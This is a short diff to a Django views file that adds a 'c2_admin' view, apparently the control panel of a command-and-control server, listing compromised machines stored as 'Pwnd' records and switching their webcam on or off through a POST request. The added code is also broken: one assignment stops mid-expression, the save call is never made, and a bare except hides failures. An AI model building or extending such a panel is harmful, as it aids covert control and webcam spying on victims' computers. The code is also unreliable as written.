@@ -43,3 +43,22 @@ def control(request):
 
     }
     return render(request, "control.json", context)
+
+def c2_admin(request):
+
+    if request.method == "POST":
+        print(request.POST["webcam"])
+        try:
+            if request.POST["webcam"]:
+                pwnd = Pwnd.objects.get(id=request.POST["id"])
+                print(pwnd.webcam)
+                pwnd.webcam = pwnd.
+                pwnd.save
+        except:
+            pass
+
+    context = {
+        "pwnds": Pwnd.objects.all()
+
+    }
+    return render(request, "c2_admin.html", context)
